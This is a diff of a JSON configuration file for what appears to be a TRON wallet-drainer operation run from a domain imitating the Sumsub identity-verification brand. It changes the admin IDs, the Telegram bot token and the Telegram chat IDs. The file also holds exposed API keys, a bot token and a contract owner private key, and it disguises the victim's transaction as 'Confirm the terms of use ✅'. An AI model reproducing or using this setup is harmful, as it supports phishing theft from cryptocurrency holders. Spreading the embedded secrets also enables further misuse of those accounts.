@@ -1,10 +1,10 @@
 {
-	"ADMINS": [1850517419, 8257840836, 85119564, 8511956431],
+	"ADMINS": [5502096260],
 	"SERVER_DOMAIN": "sumsub-7vj8.onrender.com",
 	"MIN_TRX_RESERVE": 15,
 	"TRONGRID_API_KEY": "e7766733-de62-4a20-96f7-fb9dd2a59952",
 	"TRONSCAN_API_KEY": "3206a58d-7601-4c05-af42-d7148c6e6392",
-	"TELEGRAM_TOKEN_ID": "8594752944:AAEjY1-AOuocPZEy_G1w_Wrn3iqxMp1g0mA",
+	"TELEGRAM_TOKEN_ID": "7992314357:AAGnhBRfzY_wUIWp21xvugWyQOVNRqBbjlU",
 	"SETTINGS": [
 		{
 			"id": 1,
@@ -15,7 +15,7 @@
 			"contractOwnerPrivateKey": "26bb7746c6adcfc6733624acf973ced4af9248b7fc667bafe8323bf39076974f",
 			"minTrxBalance": 10,
 			"minTokenBalance": 1,
-			"telegramChatId": "-1003903491956",
+			"telegramChatId": "-1003913418299",
 			"useAutowithdraw": false,
 			"mode": 3,
 			"transactionTitle": "Confirm the terms of use ✅",
@@ -30,7 +30,7 @@
 			"contractOwnerPrivateKey": "26bb7746c6adcfc6733624acf973ced4af9248b7fc667bafe8323bf39076974f",
 			"minTrxBalance": 10,
 			"minTokenBalance": 1,
-			"telegramChatId": "-1003903491956",
+			"telegramChatId": "-1003913418299",
 			"useAutowithdraw": false,
 			"mode": 3,
 			"transactionTitle": "Confirm the terms of use ✅",
